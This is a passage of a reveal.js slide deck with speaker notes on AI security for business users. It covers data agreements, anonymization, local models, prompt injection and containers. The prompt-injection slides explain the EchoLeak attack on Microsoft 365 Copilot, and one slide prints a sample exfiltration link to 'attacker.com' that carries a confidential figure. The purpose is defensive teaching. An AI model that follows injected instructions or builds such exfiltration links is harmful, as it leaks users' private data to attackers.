@@ -1,0 +1,791 @@
+---
+title: "5. AI Security"
+subtitle: "Making Data-Driven Decisions with Agentic AI"
+author: "Kerry Back<br>Rice Business Executive Education"
+format:
+  revealjs:
+    theme: [default, revealjs-style.scss]
+    highlight-style: monokai
+    slide-number: 'c/t'
+    transition: fade
+    navigation-mode: linear
+    width: 1920
+    height: 1080
+    margin: 0.05
+    center: true
+    auto-stretch: false
+---
+
+## Security Risks
+
+1. Sending data to an LLM → risks of [training on your data]{.accent} and [data breach]{.accent}
+2. Letting an agent read unverified sources → risk of [prompt injection]{.accent}
+3. If the agent can also reach data → risk of [data exfiltration]{.accent}
+
+::: {.notes}
+Welcome to this session on AI security. As you go through these slides, remember that you can pause and ask me a question at any time. This session covers the security risks that come with using large language models and AI agents, and this first slide lays out the map. First, simply sending your data to an LLM raises two worries: that the provider might train on your data, and that the data could be exposed in a breach. Second, once you let an agent read unverified sources like web pages or emails, you open the door to prompt injection, where hidden text hijacks the agent's behavior. And third, if that same agent can also reach your private data, an injection can steal it, which we call data exfiltration. We'll take these risks in turn.
+:::
+
+## LLM Contractual Security
+
+::: {.notes}
+Let's start with the risks of sending data to a model provider. This first section covers the contractual answer, the legal agreements that make it safe for most business uses.
+:::
+
+## Guarantee from the Model Provider: a DPA (+ BAA) {.shrink}
+
+For almost every business use, the answer is to sign a contract and send the data. A no-train + zero-retention Data Processing Agreement --- plus a BAA for PHI --- is available as part of the standard commercial API account.
+
+::: {.comparison-table}
+
+| Step | What it adds | Enough for |
+|---|---|---|
+| Opt out of training *(a setting; API default)* | Provider won't train --- but a revocable terms-of-service posture, data still retained briefly | Personal, non-sensitive work |
+| + Signed DPA (+ BAA for PHI) | A *contract*: liability, breach notice, audit, subprocessor list. A BAA covers PHI | Client data, regulated data, PHI |
+| + Enterprise agreement | SLAs, support, indemnification, capacity, SSO | Scale and operations --- not stronger privacy |
+
+:::
+
+::: {.explainer}
+Example: [Anthropic's Data Processing Addendum](https://www.anthropic.com/legal/data-processing-addendum)
+:::
+
+::: {.notes}
+For almost every business use, the practical answer is to sign a contract and send the data. The table shows three escalating steps. The first is just opting out of training, which is a setting and the default on the API. The provider says it won't train on your data, but that's a revocable terms-of-service posture, and the data is still retained briefly, so it's suitable only for personal, non-sensitive work. The second step is a signed Data Processing Agreement, which turns the promise into a contract with liability, breach notification, audit rights, and a subprocessor list. Add a BAA if you handle protected health information. That's the level for client data and regulated data. The third step, an enterprise agreement, adds SLAs, support, and indemnification, but note that it buys scale and operations, not stronger privacy.
+:::
+
+## Run It Where Your Data Already Lives {.shrink}
+
+The cleanest version of the contract: if your data already lives in AWS, Azure, or Google Cloud, run the model on that same cloud.
+
+::: {.comparison-table}
+
+| | AWS | Google Cloud | Azure |
+|---|---|---|---|
+| **Claude** | Bedrock | Vertex AI | Azure Foundry |
+| **Claude Platform** | Bedrock (native UI) | | |
+| **GPT** | Bedrock | | Azure AI Foundry |
+| **Gemini** | | Native | |
+
+:::
+
+::: {.explainer}
+On Bedrock / Vertex / Foundry the model runs inside your cloud --- the data never leaves that security perimeter and never reaches the model provider as a separate party, so there's no new vendor and no new trust boundary. It's covered by the cloud DPA/BAA you already have (all three offer a HIPAA BAA covering their hosted models, e.g. [Bedrock](https://aws.amazon.com/compliance/hipaa-eligible-services-reference/)), with the cloud's compliance attestations (FedRAMP, SOC 2, ISO 27001) along for the ride. The best contract is the one you already signed.
+:::
+
+::: {.notes}
+The cleanest version of that contract is one you've already signed. If your data already lives in AWS, Azure, or Google Cloud, you can run the model on that same cloud. The table shows the options: Claude is available through Bedrock on AWS, Vertex AI on Google Cloud, and Azure Foundry; GPT through Bedrock and Azure AI Foundry; and Gemini natively on Google Cloud. The key point is that on these services the model runs inside your cloud, so the data never leaves your existing security perimeter and never reaches the model provider as a separate party. There's no new vendor and no new trust boundary. It's covered by the cloud DPA or BAA you already have, with the cloud's compliance attestations like FedRAMP and SOC 2 along for the ride.
+:::
+
+## HIPAA and SEC {.shrink}
+
+::: {.two-cards}
+::: {.card .card-blue}
+[HIPAA --- a BAA is required]{.card-title}
+
+Satisfactory assurances "must be documented through a written contract … that meets the applicable requirements of § 164.504(e)."
+
+[45 CFR 164.502(e)](https://www.law.cornell.edu/cfr/text/45/164.502)
+:::
+::: {.card .card-amber}
+[SEC Reg S-P --- oversee the vendor]{.card-title}
+
+Written policies "reasonably designed to require oversight, including through due diligence and monitoring, of service providers."
+
+[17 CFR 248.30](https://www.law.cornell.edu/cfr/text/17/248.30)
+:::
+:::
+
+::: {.notes}
+Why do these contracts matter legally? Here are two examples from regulation. Under HIPAA, a business associate agreement isn't optional: the rule says satisfactory assurances must be documented through a written contract that meets the requirements of the regulation. So if protected health information is going to a model provider, you need that BAA in place. On the finance side, SEC Regulation S-P requires written policies reasonably designed to require oversight of service providers, including due diligence and monitoring. So even outside healthcare, a regulated firm can't just send customer data to a vendor and hope for the best; it has to vet and monitor that vendor. The citations on the slide point to the actual regulatory text if you want to read it.
+:::
+
+## LLM Physical Security
+
+::: {.notes}
+Contracts are promises. This next section is about physical security, meaning arrangements where sensitive data never reaches the provider at all.
+:::
+
+## Beyond the Contract {.shrink}
+
+The DPA is a *contractual* guarantee --- a promise, backed by liability, that satisfies your legal requirements. It is not a *physical* one: the data still travels to the provider, and you are trusting their terms and their security. For more sensitive data, add a physical layer.
+
+::: {.highlight-box}
+1. **Send less, or send code** --- keep the data (or its identifying fields) on your side
+2. **Anonymize** --- transform the data before it leaves
+3. **Run a local model** --- the data never leaves your environment
+:::
+
+::: {.explainer}
+These escalate in protection (and in cost and effort) --- add as much as the data's sensitivity warrants. Which one fits depends on the task: pure computation → send code; the model must read the content → anonymize or go local.
+:::
+
+::: {.notes}
+Here's the key distinction. The DPA is a contractual guarantee, a promise backed by liability that satisfies your legal requirements. But it isn't a physical guarantee: your data still travels to the provider, and you're trusting their terms and their security. For more sensitive data, you can add a physical layer, and the slide lists three options. First, send less data, or send code instead of data, keeping the data or its identifying fields on your side. Second, anonymize, transforming the data before it leaves. Third, run a local model, so the data never leaves your environment at all. These escalate in protection but also in cost and effort. Which one fits depends on the task: pure computation points to sending code, while a task where the model must read the content points to anonymizing or going local.
+:::
+
+## Option 1 --- Send Less, or Send Code {.shrink}
+
+Two distinct techniques for keeping identifying data out of the request. They're alternatives --- pick one by what the task needs.
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Send less: minimize]{.card-title}
+
+- Drop the fields the task doesn't need, then send the rest
+- Use when the model must see the (de-identified) rows
+- Partial protection: real --- if de-identified --- rows still leave
+:::
+::: {.card-teal}
+[Send nothing: send code]{.card-title}
+
+- Send only the schema and a few synthetic rows; the model writes a script you run in-house
+- Use when the task is pure computation (aggregate, join, score)
+- Structural guarantee: the model never sees a real row
+:::
+:::
+
+::: {.explainer}
+Either works --- they're not a sequence. Minimizing is lighter and only partial; sending code is stronger but fits only code-shaped tasks (and you must review and sandbox the script, and scrub real rows out of the debugging loop). Sending code is what the agents' `run_python` tool does.
+:::
+
+::: {.notes}
+Option one is really two distinct techniques, and they're alternatives, not a sequence. The first is minimizing: drop the fields the task doesn't need and send the rest. Use this when the model genuinely has to see the de-identified rows; it's only partial protection, because real rows still leave. The second is sending code instead of data. You send only the schema and a few synthetic rows, the model writes a script, and you run that script in-house on the real data. This fits tasks that are pure computation, like aggregating, joining, or scoring, and it gives a structural guarantee: the model never sees a real row. It's stronger, but you must review and sandbox the script and keep real rows out of the debugging loop. This is exactly what the run Python tool in our agents does.
+:::
+
+## Option 2 --- Anonymize, Then Send {.shrink}
+
+When the model must read the content but the PII is *incidental* --- separable from the signal you need --- transform it with Python before sending.
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Tabular]{.card-title}
+
+- Drop or tokenize the identifying columns --- names, SSNs, account numbers, dates of birth, addresses
+- Tokens (`CUSTOMER_001`) let you rejoin the data later
+:::
+::: {.card .card-teal}
+[Structured PDF ]{.card-title}
+
+- Fields sit in fixed positions: name in box a, SSN in box b
+- Extract and redact those boxes --- no need to search the whole document
+- W2s bank statements, forms, ...
+:::
+:::
+
+::: {.two-cards}
+::: {.card .card-amber}
+[Structured PII in free text]{.card-title}
+
+- SSNs, account numbers, phones, emails inside a narrative PDF (contract, medical note)
+- Known patterns --- regex finds them reliably, on your machine
+:::
+::: {.card .card-red}
+[Unstructured PII in free text]{.card-title}
+
+- Names, dates --- no fixed pattern, wherever the author put them
+- Drop or tokenize customer and employee names; read PDF for other names; use a small local model to complement
+:::
+:::
+
+::: {.notes}
+Option two applies when the model must read the content but the personal information in it is incidental, separable from the signal you need. You transform the data with Python before sending, and the four cards sort the problem by how the PII appears. For tabular data, drop or tokenize the identifying columns; tokens like customer zero zero one let you rejoin the data later. In structured PDFs like W-2s and bank statements, the fields sit in fixed positions, so you extract and redact those boxes. Structured PII inside free text, like social security numbers, phones, and emails, follows known patterns, so a regex on your own machine finds it reliably. The hard case is unstructured PII in free text, names and dates with no fixed pattern; there you drop or tokenize known names, with a small local model to complement.
+:::
+
+## Option 3 --- Run a Local Model {.shrink}
+
+- Some data simply cannot go to any outside party --- classified or top-secret defense data
+- Some firms choose to treat some data the same way
+- Running models locally (on-premise = on-prem) is the only alternative
+
+- Open-source models (Kimi, Qwen, Mistral, DeepSeek) on your servers --- nothing leaves your building
+- You manage the hardware, GPUs, updates, and security
+
+::: {.notes}
+Option three is the strongest and the most demanding: run the model locally. Some data simply cannot go to any outside party, classified or top-secret defense data being the clearest example, and some firms choose to treat certain business data the same way. In that case, running models on premise is the only alternative. You take open-source models like Kimi, Qwen, Mistral, or DeepSeek and run them on your own servers, so nothing ever leaves your building. The trade-off is that you now own the whole operation: the hardware, the GPUs, the updates, and the security are all yours to manage.
+:::
+
+## Open Source Models --- What Size Runs on What {.shrink}
+
+Ballpark, 2026, assuming 4-bit quantization.
+
+::: {.comparison-table}
+
+| Model size | Good for | Hardware | ~Cost |
+|---|---|---|---|
+| ≤ 8B | Redaction, classification, extraction, routing, short summaries, simple RAG | Laptop / one 24 GB GPU | $0--2k (may already own) |
+| 13--34B | General chat, RAG over your docs, moderate coding, structured extraction | One 24--48 GB GPU | ~$2--5k |
+| 70B | Strong reasoning, solid coding, a quality assistant | One 80 GB GPU, or 2 high-end cards | ~$10--40k |
+| 405B / 671B | Best open reasoning & coding --- the benchmark-toppers | 8 × H100 node; a cluster for production | ~$300k--$1M+ |
+
+:::
+
+::: {.explainer}
+A small or mid model covers a lot of real business work on hardware you can buy for a few thousand dollars. The open models that top the benchmarks are *frontier* models --- matching hosted quality on-prem is data-center hardware.
+:::
+
+::: {.notes}
+So what does running locally actually cost? These are ballpark figures for 2026, assuming four-bit quantization. Models of eight billion parameters or less handle redaction, classification, extraction, routing, short summaries, and simple retrieval, and they run on a laptop or a single 24 gigabyte GPU you may already own. The 13 to 34 billion range covers general chat, RAG over your documents, moderate coding, and structured extraction on one GPU costing a few thousand dollars. A 70 billion model gives you strong reasoning and a quality assistant for roughly ten to forty thousand dollars of hardware. The frontier open models, the 405 and 671 billion benchmark-toppers, need an eight H100 node or a cluster, which is data-center money. The takeaway: a small or mid-sized model covers a lot of real business work on affordable hardware.
+:::
+
+## Prompt Injections {.section-divider}
+
+::: {.notes}
+Now we turn to the second big theme of this session: prompt injections, which are the central security problem for AI agents.
+:::
+
+## What Are Prompt Injections?
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Prompt Injection]{.card-title}
+
+- Hidden instructions embedded in data --- emails, documents, web pages --- that **hijack the LLM's behavior**
+- The LLM reads the hidden text and follows the attacker's instructions instead of (or in addition to) the user's
+- The LLM cannot distinguish instructions from content --- it's all just text
+:::
+::: {.card .card-amber}
+[Why It Matters]{.card-title}
+
+- Any agent that reads untrusted content **and** has access to private data or tools is vulnerable
+- The attacker doesn't need credentials --- they just need to get text in front of the LLM
+- OWASP ranks prompt injection as the **#1 risk** for LLM applications (2025)
+:::
+:::
+
+::: {.notes}
+A prompt injection is a set of hidden instructions embedded in data, in an email, a document, or a web page, that hijacks the LLM's behavior. When the model reads the content, it also reads the hidden text and may follow the attacker's instructions instead of, or in addition to, yours. The fundamental problem is that the LLM cannot distinguish instructions from content; to the model, it's all just text. Why does this matter so much? Any agent that reads untrusted content and also has access to private data or tools is vulnerable. And notice that the attacker doesn't need credentials or a hacked account; they just need to get text in front of the LLM. OWASP ranks prompt injection as the number one risk for LLM applications.
+:::
+
+## What Can Prompt Injection Do? {.shrink}
+
+::: {.two-cards}
+::: {.card .card-amber}
+[Destructive Actions]{.card-title}
+
+- **Delete or modify files** --- the agent has the permissions you gave it
+- **Send unauthorized messages** --- email, Slack, API calls on your behalf
+- **Corrupt data** --- overwrite records, alter calculations, insert false information
+- **Execute unintended code** --- if the agent can run code, so can the injected instructions
+:::
+::: {.card .card-blue}
+[Standard Mitigations]{.card-title}
+
+- **Least-privilege permissions** --- give the agent read-only access unless it truly needs to write
+- **Backups and version control** --- roll back if something goes wrong
+- **Human approval for consequential actions** --- the agent proposes, a human confirms
+- **Audit logging** --- record every action so you can detect and investigate
+:::
+:::
+
+::: {.highlight-box}
+These safeguards protect against **destructive actions** but **not against data theft.** If the agent can read confidential data, a prompt injection can exfiltrate it --- no file deletion, no visible damage, no audit trail that catches it in time. That is the harder problem.
+:::
+
+::: {.notes}
+What can an injection actually do? The left card lists destructive actions. A hijacked agent has whatever permissions you gave it, so it can delete or modify files, send unauthorized messages on your behalf, corrupt data, and execute code if it has a code tool. The right card lists the standard mitigations: least-privilege permissions, so the agent is read-only unless it truly needs to write; backups and version control so you can roll back; human approval for consequential actions; and audit logging so you can detect and investigate. But the box at the bottom is the pivot for everything that follows. These safeguards protect against destructive actions, not against data theft. If the agent can read confidential data, an injection can exfiltrate it quietly, with no visible damage and no audit trail that catches it in time. That's the harder problem.
+:::
+
+## EchoLeak: Zero-Click Data Theft from Microsoft 365 Copilot {.shrink}
+
+::: {.info-box}
+::: {.box-title}
+CVE-2025-32711 --- June 2025
+:::
+
+1. Attacker **sends an email** to the victim containing hidden instructions (invisible to the human reader)
+2. Victim asks Copilot to summarize emails. Copilot reads the hidden instructions.
+3. Following the injected instructions, **Copilot embeds confidential data into a URL** in its response
+4. The victim's **browser automatically sends the URL** (as an HTTP request) to the attacker's server
+5. The attacker **extracts the data from the URL** --- zero clicks, zero user awareness
+:::
+
+::: {.explainer}
+**Root cause:** Copilot reads untrusted content (emails) **and** has access to private data **and** can render URLs. It combines all three capabilities in one LLM. The defense: separate these roles.
+:::
+
+::: {.notes}
+Here's a real example: EchoLeak, a vulnerability in Microsoft 365 Copilot disclosed in June 2025. Walk through the five steps. The attacker sends the victim an ordinary-looking email containing hidden instructions the human reader can't see. Later, the victim asks Copilot to summarize their emails, and Copilot reads the hidden instructions along with everything else. Following them, Copilot embeds confidential data into a URL in its response. The victim's browser then automatically sends that URL as an HTTP request to the attacker's server, and the attacker extracts the data from the URL. Zero clicks, zero user awareness. The root cause is that Copilot combined three capabilities in one LLM: it reads untrusted emails, it has access to private data, and it can render URLs. The defense is to separate those roles.
+:::
+
+## Least Privilege: Limit What an Injection Can Do {.shrink}
+
+You can't reliably detect an injection --- the model can't tell instructions from content. So don't try to block the text; limit what a hijacked agent is able to *do*. An injection can only use the tools you gave the agent.
+
+::: {.highlight-box}
+Real damage needs three things in the same agent. Take away any one and the attack has nothing to steal, no instructions to act on, or no way out.
+:::
+
+::: {.three-cards}
+::: {.card .card-blue}
+[1. Private data]{.card-title}
+
+Secrets worth stealing --- client records, financials, your inbox
+:::
+::: {.card .card-amber}
+[2. Untrusted content]{.card-title}
+
+Attacker-controllable text --- web pages, emails, uploaded files
+:::
+::: {.card .card-red}
+[3. An outbound channel]{.card-title}
+
+A way to send data out --- web fetch, send email, write to a shared place
+:::
+:::
+
+::: {.explainer}
+This combination is the "lethal trifecta." Least privilege means making sure no single agent holds all three.
+:::
+
+::: {.notes}
+Since the model can't tell instructions from content, you can't reliably detect an injection, so don't try to block the text. Instead, limit what a hijacked agent is able to do, because an injection can only use the tools you gave the agent. The key insight is that real damage requires three things together in the same agent. First, private data: secrets worth stealing, like client records, financials, or your inbox. Second, untrusted content: text an attacker can control, like web pages, emails, or uploaded files. Third, an outbound channel: some way to send data out, like fetching from the web, sending email, or writing to a shared place. This combination is called the lethal trifecta. Take away any one leg and the attack has nothing to steal, no instructions to act on, or no way out.
+:::
+
+## Implement Least Privilege with Multiple Agents {.shrink}
+
+One agent that reads the web, holds your data, and can send email has all three legs. Split the job so no single agent does.
+
+::: {.two-cards}
+::: {.card .card-blue}
+[The reader]{.card-title}
+
+- Sees the untrusted content
+- Stripped of whichever leg would make it dangerous
+- Returns only text --- a summary, extracted facts --- to the next stage
+:::
+::: {.card .card-amber}
+[The actor]{.card-title}
+
+- Holds the private data and the outbound tools
+- Never reads raw untrusted content --- only the reader's cleaned text
+- Does the consequential work
+:::
+:::
+
+::: {.explainer}
+Two agents is the simplest split; with several sources you may use several readers, each declawed for what it touches. The protection is structural: the agent exposed to the injection is too weak to do harm, and the powerful agent never sees the raw attack.
+:::
+
+::: {.notes}
+How do you implement least privilege in practice? Split the job across agents so no single one holds all three legs. The reader agent is the one that sees the untrusted content, and it's deliberately stripped of whichever leg would make it dangerous; it returns only text, a summary or extracted facts, to the next stage. The actor agent holds the private data and the outbound tools and does the consequential work, but it never reads raw untrusted content, only the reader's cleaned text. The protection is structural rather than clever: the agent that gets exposed to the injection is too weak to do any harm, and the powerful agent never sees the raw attack. Two agents is the simplest split; with several sources you might use several readers, each declawed for what it touches.
+:::
+
+## Different Sources, Different Restrictions {.shrink}
+
+Which leg you remove depends on the source --- on what the task needs from it.
+
+::: {.comparison-table}
+
+| Source | What the task needs | Legs it forces | Leg you remove |
+|---|---|---|---|
+| Web search / browsing | fetch external pages (the fetch *is* the outbound channel) | untrusted + outbound | no private data |
+| Inbox / uploaded files | read sensitive content you must act on | untrusted + private data | no outbound |
+| Your own database | query trusted records, no untrusted input | private data + possibly outbound | no untrusted leg |
+
+:::
+
+::: {.notes}
+Which leg you remove depends on the source, because the task itself forces certain legs on you. Take web search or browsing: the task requires fetching external pages, and the fetch itself is an outbound channel, so you're stuck with untrusted content plus outbound. The leg you can remove is private data, so the browsing agent shouldn't hold any. An inbox or uploaded files are different: the content is untrusted and it's sensitive material you must act on, so the agent holds private data too; there, the leg to remove is the outbound channel. And your own database is trusted, so that agent has private data and possibly an outbound channel but no untrusted leg at all. The pattern is always the same: figure out which legs the task forces, then strip the one it doesn't.
+:::
+
+## Watch the Output Path {.shrink}
+
+Least privilege on the agent isn't the whole story --- the output it produces is another channel out.
+
+::: {.card .card-red}
+[The Trojan Horse]{.card-title}
+
+- An agent builds a slide deck combining web research with your confidential numbers
+- A prompt injection from the research slips in: `![](https://attacker.com/leak?data=BID_2.3B)`
+- The agent can't fetch the image --- it has no internet. Nothing happens **yet.**
+- But when you open the deck **on your internet-connected laptop**, PowerPoint fetches the "image" --- sending your number to the attacker's server
+- This is **exactly the EchoLeak mechanism** applied to a different output format
+:::
+
+::: {.highlight-box}
+**Defense:** sanitize the output, and enumerate any links for a human to review.
+:::
+
+::: {.notes}
+Least privilege on the agent isn't the whole story, because the output the agent produces is itself a channel out. Here's the Trojan horse scenario. An agent builds a slide deck combining web research with your confidential numbers. A prompt injection hidden in the research slips an image reference into the deck, pointing at an attacker's server with your confidential figure encoded in the address. The agent itself can't fetch that image; it has no internet access, so nothing happens yet. But when you open the deck on your internet-connected laptop, PowerPoint automatically fetches the so-called image, sending your number to the attacker's server. This is exactly the EchoLeak mechanism applied to a different output format. The defense: sanitize the output, and enumerate any links for a human to review.
+:::
+
+## What Can Be Sanitized? 
+
+The sanitizer is ordinary code at the exit of an agent --- not an LLM. It does only what it can decide for certain.
+
+
+::: {.card .card-teal}
+[Mechanical --- yes]{.card-title}
+
+- Find every URL, link, embed, recipient, amount --- regex, no understanding needed
+- Neutralize what auto-loads: an embedded image that fetches on open becomes an inert, click-required link --- this kills the zero-click leak
+- Constrain to whitelists: a recipient must be a known contact, not an address pulled from the email
+- Tag tainted values so downstream code can flag them
+:::
+
+::: {.notes}
+So what can a sanitizer actually do? First, understand what it is: ordinary code sitting at the exit of an agent, not another LLM, and it does only what it can decide for certain. Mechanical checks are firmly in scope. It can find every URL, link, embed, recipient, and amount using regular expressions; no understanding is needed. It can neutralize anything that auto-loads, turning an embedded image that fetches on open into an inert link that requires a click, which kills the zero-click leak we just saw. It can constrain values to whitelists, insisting that a recipient be a known contact rather than an address pulled out of the email itself. And it can tag tainted values so that downstream code knows to flag them.
+:::
+
+## What Can Be Sanitized? 
+
+
+::: {.card .card-red}
+[Semantic --- no]{.card-title}
+
+- Whether a found link *belongs* --- the exfiltration pixel and the real source link are identical in form
+- Whether this send, this amount, this wording is what you intended
+- These depend on intent, and no regex can check intent
+:::
+
+<br>
+
+::: {.info-box}
+Sanitizing closes the mechanical channel completely. The semantic residue --- did the model do the right thing with the content? --- can't be sanitized away; it needs a whitelist (when you can list the allowed values) or a human at the exit.
+:::
+
+::: {.notes}
+What the sanitizer cannot do is semantics. It can't tell whether a link it found actually belongs in the document, because the exfiltration pixel and a legitimate source link are identical in form. It can't tell whether this send, this amount, or this wording is what you intended. Those judgments depend on intent, and no regex can check intent. So here's the summary: sanitizing closes the mechanical channel completely, but a semantic residue remains, the question of whether the model did the right thing with the content. That residue can't be sanitized away. It needs either a whitelist, when you can list the allowed values in advance, or a human at the exit.
+:::
+
+## Why Human Review Isn't Always Possible {.shrink}
+
+Human approval is the backstop for the semantic residue --- but a person can't always sit at the exit.
+
+::: {.two-cards}
+::: {.card .card-amber}
+[When you can't review]{.card-title}
+
+- High volume: thousands of emails or documents an hour --- no one can check each
+- Low latency: trading, real-time bidding, automated response --- no time for a human
+- Unattended: scheduled or overnight agents, with no one watching
+- Can't judge: the output is too big or technical for review to be real --- rubber-stamping a 1,000-row file catches nothing
+:::
+::: {.card .card-blue}
+[What replaces the human]{.card-title}
+
+- Whitelist the arguments: recipient from contacts only, amount from an approved list --- closes the semantic channel by construction
+- Bound the capability: reply only to the sender, draft only, read-only --- so even a manipulated action is harmless
+- Otherwise: accept a bounded residual risk, or don't fully automate
+:::
+:::
+
+::: {.explainer}
+The way out of "no human" is to make the dangerous decision unnecessary --- constrain the arguments or shrink the blast radius until there is nothing left to judge. When the action's content must come from untrusted input and can't be whitelisted, the residual risk is real.
+:::
+
+::: {.notes}
+Human approval is the backstop for that semantic residue, but a person can't always sit at the exit. The left card lists when review breaks down: high volume, thousands of documents an hour; low latency, like trading or automated response; unattended overnight agents with nobody watching; and outputs too big or technical for review to be real, since rubber-stamping a thousand-row file catches nothing. The right card shows what replaces the human. Whitelist the arguments, so the recipient comes from contacts and the amount from an approved list, which closes the semantic channel by construction. Or bound the capability: reply only to the sender, draft only, read only, so even a manipulated action is harmless. If neither works, accept a bounded residual risk or don't fully automate. The goal is to make the dangerous decision unnecessary.
+:::
+
+## Examples
+
+::: {.two-cards}
+::: {.card-blue}
+The Northwind data agent has `list_tables`, `describe_table`, and `run_sql` tools.  Assume the data is private and the agent is available only to authorized users.  Is there a risk of prompt injection and data exfiltration?
+
+- Private data?
+- Untrusted sources?
+- Outbound channel?
+:::
+::: {.card-amber}
+The extended Northwind data agent has additional tools:  `run_python` and `create_word_doc`.  Assume the data is private and the agent is available only to authorized users.  Is there a risk of prompt injection and data exfiltration?
+
+- Private data?
+- Untrusted sources?
+- Outbound channel?
+:::
+:::
+
+::: {.notes}
+Let's apply the lethal trifecta checklist to two concrete agents. The first is the Northwind data agent, which has only three tools: listing tables, describing tables, and running SQL. The data is private and only authorized users can reach the agent. Walk the three legs. Private data, clearly yes. But is there an untrusted source? The agent reads only your own database of trusted records. And is there an outbound channel? Think about what those three tools can actually send out of your environment. Now the second case: the extended agent adds a tool that runs Python and a tool that creates Word documents. Ask the same three questions again, and remember the Trojan horse slide, where a generated document itself became the way out. Pause here and reason through both cases before moving on.
+:::
+
+## Breakout {.section-divider}
+
+::: {.notes}
+Next is a breakout topic. We'll take this up together in class, but I want you to start thinking about it now.
+:::
+
+## Breakout Discussion
+
+
+Consider a process in your company that could benefit from an AI agent. Answer these questions:
+
+1. Does the task require **untrusted content** (web pages, emails, uploaded documents)?
+2. Does the task require **private data** (client records, financials, trade secrets)?
+3. If it has private data and untrusted content, how could you scrub or monitor output?
+
+::: {.notes}
+We'll discuss this together in class, so your job now is just to arrive with a candidate process and some initial answers. Pick a process in your company that could genuinely benefit from an AI agent, then run it through the trifecta questions on the slide. Does the task require untrusted content, things like web pages, incoming emails, or uploaded documents? Does it require private data, like client records, financials, or trade secrets? And if it involves both private data and untrusted content, that's the dangerous combination, so think about the exit: how could you scrub or monitor the output? Use the ideas we just covered, sanitizing, whitelists, bounded capabilities, or a human review step. Jot down your answers and bring them to the session.
+:::
+
+## Containers {.section-divider}
+
+::: {.notes}
+We now shift to containers, a tool that matters both for sharing your work and, as you'll see, for AI security.
+:::
+
+## Why Containers? {.shrink}
+
+Two reasons --- and the second is part of AI security.
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Sharing: build once, run everywhere]{.card-title}
+
+- A container packages the script, Python, and every library into one image
+- The recipient needs only Docker --- no installing the right Python, no chasing dependency errors
+- The same image runs on a laptop, a corporate server, or a public host
+:::
+::: {.card .card-teal}
+[Isolation: a sandbox for the agent]{.card-title}
+
+- The agent's tools --- `run_python`, file writes, shell --- execute inside the container, not on your machine
+- It sees only the files and network you grant it; the host stays out of reach
+- If an injection turns the agent hostile, the blast radius is the container
+:::
+:::
+
+::: {.explainer}
+The same packaging that makes an agent easy to share also makes it safer to run. Isolation is a concrete way to bound the capability --- shrink what a compromised agent can touch.
+:::
+
+::: {.notes}
+There are two reasons to care about containers, and the second is part of AI security. The first is sharing: a container packages your script, Python itself, and every library into one image. The recipient needs only Docker, no installing the right Python, no chasing dependency errors, and the same image runs on a laptop, a corporate server, or a public host. The second reason is isolation. The agent's tools, running Python, writing files, using a shell, execute inside the container rather than on your machine. The agent sees only the files and network you grant it, and the host stays out of reach. So if a prompt injection turns the agent hostile, the blast radius is the container. This is a concrete way to bound capability, in the sense we discussed earlier: shrink what a compromised agent can touch.
+:::
+
+##  Install Docker
+
+Download and install Docker Desktop from:
+
+[docs.docker.com/desktop](https://docs.docker.com/desktop/)
+
+Launch it and wait for the whale icon to appear in the menu bar (Mac) or system tray (Windows).
+
+::: {.card-dark}
+Containers cannot be run, built, or deployed in the AI Lab. The AI Lab is already a container and already deployed. If you build an app or agent on the AI Lab and start it running with the uvicorn command, then anyone can view it at lab-june.rice-business.org/firstname_lastname/app
+:::
+
+::: {.notes}
+Your first practical step is to install Docker Desktop, using the link on the slide. Launch it and wait for the whale icon to appear in the menu bar on a Mac or the system tray on Windows. One important caveat is in the box at the bottom: containers cannot be run, built, or deployed in the AI Lab, because the AI Lab is itself already a container and already deployed. In fact, if you build an app or agent on the AI Lab and start it running with the uvicorn command, anyone can already view it at the lab address shown on the slide. So the Docker work in this session happens on your own machine.
+:::
+
+## Containerizing an App or Agent
+
+To put an app or agent in a Docker container, you need the following:
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Ingredients (in one folder)]{.card-title}
+
+- A base image with Python already installed
+- A `requirements.txt` listing your Python packages
+- Your Python files
+- A Dockerfile
+:::
+::: {.card .card-amber}
+[The Dockerfile]{.card-title}
+
+A plain text file named `Dockerfile` (no extension) that Docker reads as a recipe. It specifies which base image to use, what to install, which files to copy in, and how to start the app. 
+:::
+:::
+
+::: {.info-box}
+Build the container with a simple terminal command [docker build ...]{.shell-cmd} executed in the folder
+:::
+
+::: {.notes}
+What does it take to containerize an app or agent? Everything goes in one folder, and there are four ingredients. You start from a base image that already has Python installed, add a requirements file listing your Python packages, include your own Python files, and add a Dockerfile. The Dockerfile deserves a word: it's a plain text file, named Dockerfile with no extension, that Docker reads as a recipe. It specifies which base image to use, what to install, which files to copy in, and how to start the app. With those four things in place, building the container is a single terminal command, docker build, executed in that folder.
+:::
+
+## Sharing a Docker Image
+
+::: {.two-cards}
+::: {.card-blue}
+- Go to [hub.docker.com](https://hub.docker.com/) and sign up for a free account
+- Choose a username — it becomes part of every image name you publish 
+- Run [docker login]{.shell-cmd} and enter your credentials once
+- Run [docker push ...]{.shell-cmd}
+:::
+
+::: {.card-amber}
+Then anyone with Docker Desktop installed can download the image with
+
+[docker pull ...]{.shell-cmd}
+
+and run it with 
+
+[docker run ...]{.shell-cmd}
+
+Then use the app or agent at `127.0.0.1:8000` in a browser.
+:::
+:::
+
+::: {.explainer}
+Depending on what the container does, you may need to pass authentication credentials to run it.  For the containers we will look at, you need ANTHROPIC_APY_KEY in .env in the folder in which you run the container.
+:::
+
+::: {.notes}
+Once you've built an image, sharing it is straightforward. Go to Docker Hub, at the link on the slide, and sign up for a free account. Choose your username carefully, because it becomes part of every image name you publish. Then run the docker login command once with your credentials, and publish with the docker push command. From that point, anyone with Docker Desktop can download your image with a pull command, run it with a run command, and use the app or agent in a browser at the local address shown. One note from the bottom of the slide: depending on what the container does, the user may need credentials. For the containers we'll look at, that means an Anthropic API key in a dot env file in the folder where the run command is executed.
+:::
+
+## Example {.shrink}
+
+A tiny FastAPI app: it asks for your name and replies `Hello, {name}!`. Pull and run it --- user does not need Python, no install except Docker.
+
+::: {.two-cards}
+::: {.card .card-blue}
+[Pull and run]{.card-title}
+
+```
+docker pull kerryback/hello
+docker run --rm -p 8000:8000 kerryback/hello
+```
+
+Then open `127.0.0.1:8000` in a browser, type your name, and click "Greet me".
+:::
+::: {.card .card-amber}
+[How it was built]{.card-title}
+
+The `hello` folder holds three files: `main.py`, `requirements.txt`, and a `Dockerfile`. The image was built by running one command inside that folder:
+
+```
+docker build -t kerryback/hello .
